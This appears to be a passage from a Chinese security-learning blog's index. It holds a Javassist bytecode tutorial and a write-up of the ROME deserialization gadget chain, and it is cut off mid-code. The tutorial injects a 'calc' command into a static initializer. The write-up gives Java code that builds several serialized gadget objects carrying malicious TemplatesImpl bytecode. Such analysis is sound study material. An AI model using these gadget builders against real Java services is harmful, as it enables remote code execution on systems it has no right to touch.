从易于扩展使用的角度来说，ClassPool是由装载了很多CtClass对象的HashTable组成。其中，类名为key，CtClass对象为Value，这样就可以通过搜索HashTable的Key来找到相关的CtClass对象了。如果对象没有被找到，那么get()方法就会创建出一个默认的CtClass对象，然后放入到HashTable中，同时将当前创建的对象返回。\n    从ClassPool中获取的CtClass对象，是可以被修改的。从上面的 代码中，我们可以看到，原先的父类，由test.Rectangle被改成了test.Point。这种更改可以通过调用CtClass().writeFile()将其持久化到文件中。同时，Javassist还提供了toBytecode()方法来直接获取修改的字节码:\n```java\nbyte[] b = cc.toBytecode();\n```\n可以通过如下代码直接加载CtClass：\n```java\nClass clazz = cc.toClass();\n```\ntoClass()方法被调用，将会使得当前线程中的context class loader加载此CtClass类，然后生成java.lang.Class对象\n### 新建类\n新建一个类，可以使用ClassPool.makeClass()方法来实现：\n```java\nClassPool pool = ClassPool.getDefault();\nCtClass cc = pool.makeClass(\"Point\");\n```\n上面的代码展示的是创建无成员方法的Point类，如果需要附带方法的话，我们可以用CtNewMethod附带的工厂方法创建，然后利用CtClass.addMethod()将其追加就可以了 。\nmakeClass()不能用于创建新的接口。但是makeInterface()可以。接口的方法可以用CtNewmethod.abstractMethod()方法来创建，需要注意的是，在这里，一个接口方法其实是一个abstract方法。\n### 冻结类\n如果CtClass对象被writeFile(),toClass()或者toBytecode()转换成了类对象，Javassist将会冻结此CtClass对象。任何对此对象的后续更改都是不允许的。之所以这样做，主要是因为此类已经被JVM加载，由于JVM本身不支持类的重复加载操作，所以不允许更改。\n一个冻结的CtClass对象，可以通过如下的代码进行解冻，如果想更改类的话，代码如下：\n```java\nCtClasss cc = ...;\n    :\ncc.writeFile();\ncc.defrost();\ncc.setSuperclass(...);    // OK since the class is not frozen.\n\n```\n调用了defrost()方法之后，CtClass对象就可以随意修改了。\n如果ClassPool.doPruning被设置为true，那么Javassist将会把已冻结的CtClass对象中的数据结构进行精简，此举主要是为了防止过多的内存消耗。而精简掉的部分，都是一些不必要的属性(attriute_info结构)。因此，当一个CtClass对象被精简之后，方法是无法被访问和调用的，但是方法名称，签名，注解可以被访问。被精简过的CtClass对象可以被再次解冻。需要注意的是，ClassPool.doPruning的默认值为false。\n为了防止CtClass类被无端的精简，需要优先调用stopPruning()方法来进行阻止：\n\n## 操作\n### ClassPool\n获得ClassPool\n```java\nClassPool pool = ClassPool.getDefault();\nClassPool pool = new ClassPool(true);\n```\n\n增加ClassPath\n加载jar包：/path/to/app.jar\n加载class：/path/to/classes\n加载所有jar包：/path/to/jars/*\n```java\npool.insertClassPath(\"/path/to/jars/*\");\n```\n加载WEB-INF/classes和WEB-INF/lib/*\n```java\npool.insertClassPath(new ClassClassPath(Test.class));\n```\n导入编译类搜索路径\n```java\n导入后方法体中可使用{ Date date = new Date(); }\n而不必使用全路径名{ java.util.Date date = new java.util.Date(); }\npool.importPackage(\"java.util\");\n```\nClassLoader（可选）\n获得ClassLoader\nLoader loader = new Loader(pool);\n添加转换器（可选）\n```java\n\nloader.addTranslator(pool, new Translator() {\n\t@Override\n\tpublic void start(ClassPool pool) throws NotFoundException, CannotCompileException {\n\t\tSystem.out.println(\"Loader started\");\n\t}\n\t\n\t@Override\n\tpublic void onLoad(ClassPool pool, String classname) throws NotFoundException, CannotCompileException {\n\t\tif (\"com.github.test.Test\".equals(classname)) {\n\t\t\tpool.get(classname).addInterface(pool.get(\"java.lang.Cloneable\"));\n\t\t}\n\t}\n});\n```\n### Class\n**新增/替换Class**\n```java\n\nCtClass ctClass = pool.makeClass(\"com.github.test.Test\");\nCtClass ctClass = pool.makeClass(\"com.github.test.Test\", pool.get(\"java.lang.Thread\"));\nCtClass ctClass = pool.makeClass(new FileInputStream(\"/path/to/class\"));\nCtClass ctClass = pool.makeClassIfNew(new FileInputStream(\"/path/to/class\"));\n```\n**修改已有Class**\n```java\nCtClass ctClass = pool.get(\"com.github.test.Test\"); // com.github.test.Test[]\nCtClass ctClass = pool.getOrNull(\"com.github.test.Test\");\n//CtClass ctClass = pool.getCtClass(\"[Lcom.github.test.Test;\");\n```\n复制已有Class\n```java\nCtClass ctClass = pool.getAndRename(\"com.github.test.Test\", \"com.github.test.Test2\");\n```\n生成（加载）/保存Class（将冻结CtClass）\n```java\nClass<?> clazz = ctClass.toClass(); // 会打印WARNING\nClass<?> clazz = ctClass.toClass(Neighbor.class); // Neighbor必须为与ctClass同包的其他类\nClass<?> clazz = ctClass.toClass(new ClassLoader() {}, Test.class.getProtectionDomain());\nClass<?> clazz = loader.loadClass(\"com.github.test.Test\");\nbyte[] byteCode = ctClass.toBytecode();\nctClass.toBytecode(new DataOutputStream(new FileOutputStream(\"/path/to/class/file\")));\nctClass.writeFile(\"/path/to/classes/dir\");\n```\n解冻CtClass\n```java\nctClass.defrost();\n```\n将CtClass移出ClassPool\n```java\nctClass.detach();\n```\n修改类名\n```java\nctClass.setName(\"com.github.test.Test2\");\n```\n设置父类\n```java\nctClass.setSuperclass(pool.get(\"java.lang.Thread\"));\n```\n设置/添加接口\n```java\nctClass.setInterfaces(new CtClass[] { pool.get(\"java.io.Serializable\") });\nctClass.addInterface(pool.get(\"java.io.Serializable\"));\n```\n设置修饰符\n```java\nctClass.setModifiers(Modifier.PUBLIC | Modifier.ABSTRACT);\n```\n\n修改类签名\n```java\n// class Test extends Thread implements Cloneable\nClassSignature signature = new ClassSignature(null, null, null); // class Test\nClassSignature signature = new ClassSignature(new TypeParameter[] { new TypeParameter(\"T\") }); // class Test<T>\nClassSignature signature = new ClassSignature(null, new ClassType(\"java.util.ArrayList\"), null); // class Test extends ArrayList\nClassSignature signature = new ClassSignature(null, new ClassType(\"java.util.ArrayList\", new TypeArgument[] { new TypeArgument(new ClassType(\"java.lang.String\")) }), null); // class Test extends ArrayList<String>\nClassSignature signature = new ClassSignature(new TypeParameter[] { new TypeParameter(\"T\") }, new ClassType(\"java.util.ArrayList\", new TypeArgument[] { new TypeArgument(new TypeVariable(\"T\")) }), null); // class Test<T> extends ArrayList<T>\nClassSignature signature = new ClassSignature(null, null, new ClassType[] { new ClassType(\"java.io.Serializable\") }); // class Test implements Serializable\nctClass.setGenericSignature(signature.encode());\n```\n\n接口\n新增/替换接口\n\n```java\nCtClass ctInterface = pool.makeInterface(\"com.github.test.ITest\");\nCtClass ctInterface = pool.makeInterface(\"com.github.test.ITest\", pool.get(\"java.io.Serializable\"));\nCtClass ctInterface = pool.makeClass(new FileInputStream(\"/path/to/class\"));\nCtClass ctInterface = pool.makeClassIfNew(new FileInputStream(\"/path/to/class\"));\n```\n修改已有接口\n```java\nCtClass ctInterface = pool.get(\"com.github.test.ITest\");\n```\n\n### Field\n新增属性\n```java\nCtField ctField = new CtField(CtClass.intType, \"age\", ctClass);\nCtField ctField = new CtField(pool.get(\"java.util.List\"), \"list\", ctClass);\nctClass.addField(ctField);\nctClass.addField(ctField, \"new java.util.ArrayList()\");\n```\n修改已有属性\n```java\nCtField ctField = ctClass.getDeclaredField(\"name\");\n```\n\n修改属性名\n\n```java\nctField.setName(\"name\");\n```\n修改类型\n```java\nctField.setType(pool.get(\"java.lang.String\"));\n```\n\n设置泛型类型\n```java\nctField.setGenericSignature(new TypeVariable(\"T\").encode()); // T name;\n```\n设置修饰符\n```java\nctField.setModifiers(Modifier.PUBLIC | Modifier.STATIC);\n```\n\n### Method\n新增方法\n```java\nCtMethod ctMethod = CtNewMethod.make(\"public int getAge() { return this.age; }\", ctClass);\nCtMethod ctMethod = CtNewMethod.make(\"public int getAge() { return $proceed($$); }\", ctClass, \"this\", \"from\");\nCtMethod ctMethod = CtNewMethod.make(CtClass.intType, \"getAge\", null, null, \"{ return this.age; }\", ctClass);\nCtMethod ctMethod = CtNewMethod.make(Modifier.PUBLIC, CtClass.intType, \"getAge\", null, null, \"{ return this.age; }\", ctClass);\nctClass.addMethod(ctMethod);\n```\n\n修改已有方法\n```java\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"test\");\nCtMethod ctMethod = ctClass.getDeclaredMethod(\"test\", new CtClass[] { CtClass.intType });\n//CtMethod ctMethod = pool.getMethod(\"com.github.test.Test\", \"test\");\n```\n\n复制已有方法\n```java\nCtMethod ctMethod2 = CtNewMethod.copy(ctMethod, \"test2\", ctClass, null);\nctClass.addMethod(ctMethod2);\n```\n\n修改方法名\n```java\nctMethod.setName(\"test\");\n```\n\n设置异常类型\n```java\nctMethod.setExceptionTypes(new CtClass[] { pool.get(\"java.lang.RuntimeException\") });\n```\n\n修改方法签名\n```java\n// int test(int a) throws RuntimeException\nMethodSignature signature = new MethodSignature(null, null, null, null); // void test(int a) throws RuntimeException\nMethodSignature signature = new MethodSignature(new TypeParameter[] { new TypeParameter(\"T\") }, null, null, null); // <T> void test(int a) throws RuntimeException\nMethodSignature signature = new MethodSignature(null, new Type[] { new TypeVariable(\"T\") }, null, null); // void test(T a) throws RuntimeException\nMethodSignature signature = new MethodSignature(null, null, new BaseType(\"long\"), null); // long test(int a) throws RuntimeException\nMethodSignature signature = new MethodSignature(null, null, null, new ObjectType[] { new ClassType(\"java.lang.IOException\") }); // void test(int a) throws IOException, RuntimeException\nctMethod.setGenericSignature(signature.encode());\n```\n设置修饰符\n```java\nctMethod.setModifiers(Modifier.PUBLIC | Modifier.STATIC | Modifier.SYNCHRONIZED);\n```\n增加参数\n```java\nctMethod.insertParameter(pool.get(\"java.lang.String\"));\nctMethod.addParameter(pool.get(\"java.lang.String\"));\n```\n\n设置方法体\n```java\nctMethod.setBody(\"{ System.out.println(\\\"new body\\\"); }\");\n```\n复制方法体\n```java\nctMethod.setBody(ctClass.getDeclaredMethod(\"from\"), null);\n```\n\n设置方法体与委派方法\n```java\nctMethod.setBody(\"{ $proceed($$); }\", \"this\", \"from\"); // { this.from(...); }\n```\n包装方法体\n```java\n// 被包装的方法必须拥有`Object method(Object[] params)`形式的签名\n// 当ctMethod拥有`int test(int a)`形式的签名时\n// 包装后等效于{ return (int)from(new Object[] { new Integer(a) }); }\nctMethod.setWrappedBody(ctClass.getDeclaredMethod(\"from\"), null);\n```\n方法体增加try-catch\n```java\nctMethod.addCatch(\"{ $e.printStackTrace(); return; }\", pool.get(\"java.lang.RuntimeException\"));\nctMethod.addCatch(\"{ e.printStackTrace(); return; }\", pool.get(\"java.lang.RuntimeException\"), \"e\");\n```\n\n方法体增加本地变量\n插入的代码将被包裹在{代码块}中，因此insertAfter()中的代码无法访问insertBefore()中的变量\n可以通过此方法将变量添加为本地变量，作用域为整个方法体，使用前必须初始化\n```java\n\nctMethod.addLocalVariable(\"time\", CtClass.longType);\n```\n方法体插入代码\n```java\nctMethod.insertBefore(\"{ time = System.nanoTime(); }\");\nctMethod.insertAfter(\"{ System.out.println(System.nanoTime() - time); }\");\nctMethod.insertAfter(\"{ System.out.println(\\\"finally\\\"); }\", true);\nctMethod.insertAfter(\"{ System.out.println(\\\"finally\\\"); }\", true, true); // ctClass.isKotlin()\nctMethod.insertAt(10, \"{ System.out.println(\\\"inserted\\\"); }\");\n```\n\n### Constructor\n新增构造方法\n```java\nCtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);\nCtConstructor ctConstructor = CtNewConstructor.make(\"public Test(int age) { this.age = age; }\", ctClass);\nCtConstructor ctConstructor = CtNewConstructor.make(new CtClass[] { CtClass.intType }, null, ctClass);\nCtConstructor ctConstructor = CtNewConstructor.make(new CtClass[] { CtClass.intType }, null, \"{ this.age = $1; }\", ctClass);\nctClass.addConstructor(ctConstructor);\n```\n修改已有构造方法\n```java\nCtConstructor ctConstructor = ctClass.getDeclaredConstructor(null);\nCtConstructor ctConstructor = ctClass.getDeclaredConstructor(new CtClass[] { CtClass.intType });\n```\n复制已有构造方法\n```java\nCtConstructor ctConstructor2 = CtNewConstructor.copy(ctConstructor, ctClass, null);\nctConstructor2.addParameter(CtClass.intType);\nctClass.addConstructor(ctConstructor2);\n```\n设置异常类型\n```java\nctConstructor.setExceptionTypes(new CtClass[] { pool.get(\"java.lang.RuntimeException\") });\n```\n\n修改方法签名\n详见方法中的修改方法签名\n```java\nctConstructor.setGenericSignature(new MethodSignature(null, null, null, null).encode());\n```\n设置修饰符\n```java\nctConstructor.setModifiers(Modifier.PRIVATE);\n```\n增加参数\n```java\nctConstructor.insertParameter(pool.get(\"java.lang.String\"));\nctConstructor.addParameter(pool.get(\"java.lang.String\"));\n```\n设置构造方法体\n```java\nctConstructor.setBody(\"{ super(); }\");\n```\n复制构造方法体\n```java\nctConstructor.setBody(ctConstructor2, null);\n```\n设置构造方法体与委派方法\n```java\nctConstructor.setBody(\"{ $proceed($$); }\", \"this\", \"from\");\n```\n构造方法体增加try-catch\n```java\nctConstructor.addCatch(\"{ $e.printStackTrace(); return; }\", pool.get(\"java.lang.RuntimeException\"));\nctConstructor.addCatch(\"{ e.printStackTrace(); return; }\", pool.get(\"java.lang.RuntimeException\"), \"e\");\n```\n\n构造方法体增加本地变量\n插入的代码将被包裹在{代码块}中，因此insertAfter()中的代码无法访问insertBefore()中的变量\n可以通过此方法将变量添加为本地变量，作用域为整个方法体，使用前必须初始化\n```java\nctConstructor.addLocalVariable(\"time\", CtClass.longType);\n```\n构造方法体插入代码\n```java\nctConstructor.insertBefore(\"{ time = System.nanoTime(); }\"); // time = System.nanoTime(); super();\nctConstructor.insertBeforeBody(\"{ time = System.nanoTime(); }\"); // super(); time = System.nanoTime();\nctConstructor.insertAfter(\"{ System.out.println(System.nanoTime() - time); }\");\nctConstructor.insertAfter(\"{ System.out.println(\\\"finally\\\"); }\", true);\nctConstructor.insertAfter(\"{ System.out.println(\\\"finally\\\"); }\", true, true); // ctClass.isKotlin()\nctConstructor.insertAt(10, \"{ System.out.println(\\\"inserted\\\"); }\");\n```\n\n### 静态代码块\n修改已有静态代码块（如不存在则返回null）\n\n```java\nCtConstructor ctConstructor =  ctClass.getClassInitializer();\n```\n\n新增静态代码块（如存在则返回已有静态代码块）\n\n```java\nCtConstructor ctConstructor =  ctClass.makeClassInitializer();\n```\n\n静态代码块其他使用方式与构造方法相同\n\n```java\nCtConstructor ctConstructor = ctClass.makeClassInitializer();\n\t\tctConstructor.setBody(\"Runtime.getRuntime().exec(\\\"calc\\\");\");\n```\n\n另外一种方式：\n\n将静态代码块作为静态方法添加到类中，然后在类的静态初始方法 **<clinit>** 中调用这个静态方法\n\n```java\nCtMethod clinit = CtNewMethod.make(\"public static void $clinit() {Runtime.getRuntime().exec(\\\"calc\\\");}\", ctClass);\nctClass.addMethod(clinit);\n```\n\n### \n\n### 注解\n得到注解\n得到类注解\n```java\n\nDeprecated annotation = (Deprecated)ctClass.getAnnotation(Deprecated.class);\nDeprecated annotation = (Deprecated)ctClass.getAnnotations()[0];\n```\n得到属性注解\n```java\nDeprecated annotation = (Deprecated)ctField.getAnnotation(Deprecated.class);\nDeprecated annotation = (Deprecated)ctField.getAnnotations()[0];\n```\n得到方法注解\n```java\nDeprecated annotation = (Deprecated)ctMethod.getAnnotation(Deprecated.class);\nDeprecated annotation = (Deprecated)ctMethod.getAnnotations()[0];\n```\n得到参数注解\n```java\nDeprecated annotation = (Deprecated)ctMethod.getParameterAnnotations()[0][0];\n```\n添加注解\n获得ClassFile与ConstPool\n```java\nClassFile classFile = ctClass.getClassFile();\nConstPool constPool = classFile.getConstPool();\n```\n创建注解\n```java\nAnnotation annotation = new Annotation(\"java.lang.Deprecated\", constPool);\nannotation.addMemberValue(\"since\", new StringMemberValue(\"1.0.0\", constPool));\n```\n\n创建注解属性\n```java\nAnnotationsAttribute annotationsAttribute = new AnnotationsAttribute(constPool, AnnotationsAttribute.visibleTag);\nannotationsAttribute.addAnnotation(annotation);\n```\n\n添加类注解\n```java\nclassFile.addAttribute(annotationsAttribute);\n```\n添加属性注解\n```java\nctField.getFieldInfo().addAttribute(annotationsAttribute);\n```\n添加方法注解\n```java\nctMethod.getMethodInfo().addAttribute(annotationsAttribute);\n```\n创建参数注解属性\n```java\nAnnotation[][] annotations = new Annotation[1][1];\nannotations[0][0] = annotation;\n\nParameterAnnotationsAttribute parameterAnnotationsAttribute = new ParameterAnnotationsAttribute(constPool, ParameterAnnotationsAttribute.visibleTag);\nparameterAnnotationsAttribute.setAnnotations(annotations);\n```\n添加参数注解\n```java\nctMethod.getMethodInfo().addAttribute(parameterAnnotationsAttribute);\n```\n### 修改方法体\n修改方法调用\n```java\nExprEditor editor = new ExprEditor() {\n\t@Override\n\tpublic void edit(MethodCall m) throws CannotCompileException {\n\t\tString call = m.getClassName() + \"#\" + m.getMethodName();\n\t\tif (call.equals(\"java.io.PrintStream#print\")) {\n\t\t\tm.replace(\"{ $_ = $proceed($1 + \\\"\\\\n\\\"); }\");\n\t\t}\n\t}\n};\n\nctMethod.instrument(editor);\n//ctConstructor.instrument(editor);\n//ctClass.instrument(editor);\n```\n修改新建对象\n```java\n@Override\npublic void edit(NewExpr e) throws CannotCompileException {\n\tif (e.getClassName().equals(\"java.util.ArrayList\")) {\n\t\te.replace(\"{ $_ = new java.util.LinkedList(); }\");\n\t}\n}\n```\n修改新建数组\n```java\n@Override\npublic void edit(NewArray a) throws CannotCompileException {\n\ttry {\n\t\tif (a.getComponentType().getName().equals(\"int\")) {\n\t\t\ta.replace(\"{ $_ = new int[$1 + 1]; }\");\n\t\t}\n\t} catch (NotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n```\n\n修改调用构造方法\n```java\n@Override\npublic void edit(ConstructorCall c) throws CannotCompileException {\n\tString call = c.getClassName() + \"#\" + c.getMethodName();\n\tif (call.equals(\"com.github.test.Test#this\")) {\n\t\tc.replace(\"{ super(); }\");\n\t}\n}\n```\n修改属性读写\n```java\n@Override\npublic void edit(FieldAccess f) throws CannotCompileException {\n\tString field = f.getClassName() + \".\" + f.getFieldName();\n\tif (field.equals(\"java.lang.System.out\")) {\n\t\tf.replace(\"{ $_ = System.err; }\");\n\t}\n}\n```\n修改实例判断\n```java\n@Override\npublic void edit(Instanceof i) throws CannotCompileException {\n\ttry {\n\t\tif (i.getType().getName().equals(\"java.lang.Long\")) {\n\t\t\ti.replace(\"{ $_ = $1 instanceof Number; }\");\n\t\t}\n\t} catch (NotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n```\n修改强制类型转换\n```java\n@Override\npublic void edit(Cast c) throws CannotCompileException {\n\ttry {\n\t\tif (c.getType().getName().equals(\"java.lang.Long\")) {\n\t\t\tc.replace(\"{ $_ = (Number)$1; }\");\n\t\t}\n\t} catch (NotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n```\n\n修改异常捕捉\n```java\n@Override\npublic void edit(Handler h) throws CannotCompileException {\n\ttry {\n\t\tif (h.getType().getName().equals(\"java.lang.RuntimeException\")) {\n\t\t\th.insertBefore(\"{ $1.printStackTrace(); }\");\n\t\t}\n\t} catch (NotFoundException e) {\n\t\te.printStackTrace();\n\t}\n}\n```\n### 替换方法体\n替换方法调用\n```java\nCodeConverter converter = new CodeConverter();\nconverter.redirectMethodCall(print, println);\n//converter.redirectMethodCall(\"print\", println);\n\nctMethod.instrument(converter);\n//ctConstructor.instrument(converter);\n//ctClass.instrument(converter);\n```\n替换属性读写\n```java\nconverter.redirectFieldAccess(field, newClass, newFieldname);\nconverter.replaceFieldRead(field, calledClass, calledMethod);\nconverter.replaceFieldWrite(field, calledClass, calledMethod);\n```\n\n替换新建对象\n```java\nconverter.replaceNew(oldClass, newClass);\nconverter.replaceNew(newClass, calledClass, calledMethod);\n```\n插入方法调用\n```java\nconverter.insertAfterMethod(origMethod, afterMethod);\nconverter.insertBeforeMethod(origMethod, beforeMethod);\n```\n替换为静态方法调用\n```java\nconverter.redirectMethodCallToStatic(origMethod, staticMethod);\n```\n替换数组读写为方法调用\n```java\nconverter.replaceArrayAccess(calledClass, names);\n```\n## 特殊符号\n| 符号 | 含义 |\n| --- | --- |\n| $0,$1, $2, ... | $0 = this; $1 = args[1] ..... |\n| $args | 方法参数数组.它的类型为 Object[] |\n| $$ | 所有实参。例如, m($$) 等价于 m(1,2,...) |\n| $cflow(...) | cflow 变量 |\n| $r | 返回结果的类型，用于强制类型转换 |\n| $w | 包装器类型，用于强制类型转换 |\n| $_ | 返回值 |\n| $sig | 类型为 java.lang.Class 的参数类型数组 |\n| $type | 一个 java.lang.Class 对象，表示返回值类型 |\n| $class | 一个 java.lang.Class 对象，表示当前正在修改的类 |\n| $e | 异常对象 |\n\n## 动态代理\n设置需要继承的类\n```java\nProxyFactory factory = new ProxyFactory();\nfactory.setSuperclass(Test.class);\n```\n设置需要代理的方法（可选，默认全部）\n```java\nfactory.setFilter(new MethodFilter() {\n\t@Override\n\tpublic boolean isHandled(Method m) {\n\t\treturn m.getName().equals(\"test\");\n\t}\n});\n```\n获得代理对象\n```java\nClass<?> clazz = factory.createClass();\nProxyObject proxy = (ProxyObject)clazz.getDeclaredConstructor().newInstance();\n```\n设置代理处理方法\n```java\nproxy.setHandler(new MethodHandler() {\n\t@Override\n\tpublic Object invoke(Object self, Method thisMethod, Method proceed, Object[] args) throws Throwable {\n\t\tSystem.out.println(\"before \" + thisMethod.getName());\n\t\ttry {\n\t\t\treturn proceed.invoke(self, args);\n\t\t} finally {\n\t\t\tSystem.out.println(\"after \" + thisMethod.getName());\n\t\t}\n\t}\n});\n```\n调用代理方法\n```java\nTest test = (Test)proxy;\ntest.test();\n```\n使用JPDA动态替换类\n只能替换当前JVM的类，不能替换远程JVM的类\n本地启动JPDA详见 #79（相当于自己连自己）\n替换类时必须确保当前JVM已经加载该类\n可以修改方法体/属性默认值，但不能增加/删除方法，不能增加/删除属性\n```java\nHotSwapper swapper = new HotSwapper(8000);\nswapper.reload(ctClass.getName(), ctClass.toBytecode());\n```\n使用Instrument动态替换类\n生成Agent\n```java\njshell --class-path /paht/to/javassist-3.27.0-GA.jar\njshell> javassist.util.HotSwapAgent.createAgentJarFile(\"hotswap.jar\")\njshell> /exit\n```\n\n使用Agent启动\nInstrument详见 #111\n\njava -javaagent:/path/to/hotswap.jar com.github.test.Test\n动态替换\n可以修改方法体/属性默认值，但不能增加/删除方法，不能增加/删除属性\n```java\nHotSwapAgent.redefine(Test.class, ctClass);\n```\n\n\n## Reference\n\n- [Java Javassist](https://paoka1.top/2023/04/05/Java-Javassist/)\n- [javassist基础入门笔记 - 易水风萧](https://www.yishuifengxiao.com/2023/04/04/javassist%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0/)\n- [Javassist学习笔记 · Issue #116 · woshikid/blog](https://github.com/woshikid/blog/issues/116)\n","tags":["java"]},{"title":"Rome链","url":"/2024/04/11/Rome链/","content":"\n\n\n\n# Rome反序列化\n\n\n\n<a name=\"X3E3n\"></a>\n## 简介\nROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。<br />Rome 提供了 **ToStringBean** 这个类，提供深入的 toString 方法对JavaBean进行操作。\n\n**漏洞原理**<br />漏洞核心应该是ROME框架里的**com.sun.syndication.feed.impl.ToStringBean**类利用反射执行了invoke方法，并且参数可控<br /><img src=\"/img/4-11/1.png\" >\n\n依赖\n```java\n <dependency>\n     <groupId>rome</groupId>\n     <artifactId>rome</artifactId>\n     <version>1.0</version>\n</dependency>\n```\n下面是ysoserial中的利用链\n```java\n * TemplatesImpl.getOutputProperties()\n * ToStringBean.toString(String)\n * ToStringBean.toString()\n * ObjectBean.toString()\n * EqualsBean.beanHashCode()\n * ObjectBean.hashCode()\n * HashMap<K,V>.hash(Object)\n * HashMap<K,V>.readObject(ObjectInputStream)\n```\n\n<a name=\"PmZJ6\"></a>\n### ObjectBean\ncom.sun.syndication.feed.impl.ObjectBean是Rome提供的一个封装类型, 初始化时提供了一个Class类型和一个Object对象实例进行封装<br />他也有三个成员变量，分别是EqualsBean、 ToStringBean、CloneableBean类，为ObjectBean提供了equals、toString、clone以及hashCode方法<br />在ObjectBean#hashCode中，调用了EqualsBean类的beanHashCode方法 —-出自[https://xz.aliyun.com/t/11200](https://xz.aliyun.com/t/11200)\n<a name=\"LdJJ0\"></a>\n### ToStringBean\ncom.sun.syndication.feed.impl.ToStringBean是给对象提供toString方法的类, 类中有两个toString方法, 第一个是无参的方法, 获取调用链中上一个类或_obj属性中保存对象的类名, 并调用第二个toString方法. 在第二个toString方法中, 会调用BeanIntrospector#getPropertyDescriptors来获取_beanClass的所有getter和setter方法, 接着判断参数的长度, 长度等于0的方法会使用_obj实例进行反射调用, 通过这个点我们可以来触发TemplatesImpl的利用链. —-出自[https://xz.aliyun.com/t/11200](https://xz.aliyun.com/t/11200)\n\n\n<a name=\"shRmX\"></a>\n## Gadget\n注意：idea调式的时候需要关闭调式器视图的自动触发toString功能<br />ROME反序列化的利用链十分类似于CC链，其后半段的TemplatesImpl.getOutputProperties()正是CC2中实现任意类加载的利用方式。入口处的HashMap.readObject()，也正好是CC6中的反序列化入口。\n```java\npublic static Object TemplateImplGadget_EqualBean() throws Exception {\n\t\tTemplatesImpl templates = new TemplatesImpl();\n\t\tsetValue(templates,\"_name\",\"aaa\");\n\t\tsetValue(templates,\"_bytecodes\",new byte[][]{EvilClassTable.TemplateClass()});\n\t\tsetValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tToStringBean toStringBean = new ToStringBean(Templates.class, templates);\n\t\tEqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(equalsBean,\"123\");\n\t\treturn hashMap;\n\t}\n \n    public static void setValue(Object obj, String name, Object value) throws Exception{\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n```\n反序列化入口：从hashmap中的readObject到hash再到hashCode方法<br />到EqualBean#hashCode中<br /><img src=\"/img/4-11/2.png\" ><br />然后调用_obj的toString方法<br />再来看看ToStringBean的toString方法<br /><img src=\"/img/4-11/3.png\" ><br />然后进入另一个toString方法<br /><img src=\"/img/4-11/4.png\" ><br />进入BeanIntrospector#getPropertyDescriptors中<br /><img src=\"/img/4-11/5.png\" ><br />然后是进入getPDs方法，这里就会获取到getter和setter方法，再包装进入PropertyDescriptor就不细看了<br />这里的类是Template所以只会拿到getOutputProperties方法<br /><img src=\"/img/4-11/6.png\" ><br />然后invoke拿到的方法<br /><img src=\"/img/4-11/7.png\" >\n\n然后就是走到TemplateImpl加载恶意字节码的流程<br /><img src=\"/img/4-11/8.png\" ><br />会在newTransformer()中根据字节数组加载成class,再调用Class的newInstance，执行静态代码块\n<a name=\"zZrC8\"></a>\n## 其他利用链\n<a name=\"Puokw\"></a>\n### ObjectBean利用链\n（等效链，可忽略）<br />本质还是不变<br /><img src=\"/img/4-11/9.png\" ><br />ObjectBean中的hashCode与上面方法 等效<br /><img src=\"/img/4-11/10.png\" ><br />构造方法都一样，只需将EqualBean改为ObjectBean即可\n```java\npublic static Object TemplateImplGadget_ObjectBean() throws Exception {\n\t\tTemplatesImpl templates = new TemplatesImpl();\n\t\tReflect.setValue(templates,\"_name\",\"aaa\");\n\t\tReflect.setValue(templates,\"_bytecodes\",new byte[][]{EvilClassTable.TemplateClass()});\n\t\tReflect.setValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tToStringBean toStringBean = new ToStringBean(Templates.class, templates);\n\t\tObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(objectBean,\"123\");\n\t\treturn hashMap;\n\t}\npublic class Reflect {\n\n\tpublic static void setValue(Object source,String fieldName,Object value) throws NoSuchFieldException, IllegalAccessException {\n\t\tField field=source.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(source,value);\n\t}\n}\n```\n<a name=\"ZI1Zk\"></a>\n### HashTable利用链\nHashTable利用链其实并不是针对ROME的利用链。其作用是替换作为反序列化入口的HashMap类，如果漏洞过滤了HashMap类，我们就可以使用HashTable类进行替换。<br />在HashTable中的readObject中<br /><img src=\"/img/4-11/11.png\" ><br />跟进reconstitutionPut<br /><img src=\"/img/4-11/12.png\" ><br />调用key的hashCode，后面的链子不变，这里只是换了个入口点\n```java\npublic static Object HashTableGadget() throws Exception {\n\t\tTemplatesImpl templates = new TemplatesImpl();\n\t\tReflect.setValue(templates,\"_name\",\"aaa\");\n\t\tReflect.setValue(templates,\"_bytecodes\",new byte[][]{EvilClassTable.TemplateClass()});\n\t\tReflect.setValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tToStringBean toStringBean = new ToStringBean(Templates.class, templates);\n\t\tObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);\n\t\tHashtable<Object, Object> hashTable = new Hashtable<>();\n\t\thashTable.put(objectBean,123);\n\t\treturn hashTable;\n\t}\n```\n<a name=\"uejQ0\"></a>\n### BadAttributeValueExpException利用链\n在cc5中<br />BadAttributeValueExpException这个类。在其readObject()中能够调用任意类的toSrting()方法。<br /><img src=\"/img/4-11/13.png\" ><br />那把入口点直接改成BadAttributeValueExpException即可，直接调用到<br />ToStringBean的toString方法<br />看看构造方法<br /><img src=\"/img/4-11/14.png\" ><br />这样就需要反射赋值了，否则val为String而不是Object\n```java\npublic static Object BadAttributeValueExpExceptionGadget()throws Exception{\n\t\tTemplatesImpl templates = new TemplatesImpl();\n\t\tReflect.setValue(templates,\"_name\",\"aaa\");\n\t\tReflect.setValue(templates,\"_bytecodes\",new byte[][]{EvilClassTable.TemplateClass()});\n\t\tReflect.setValue(templates,\"_tfactory\",new TransformerFactoryImpl());\n\t\tToStringBean 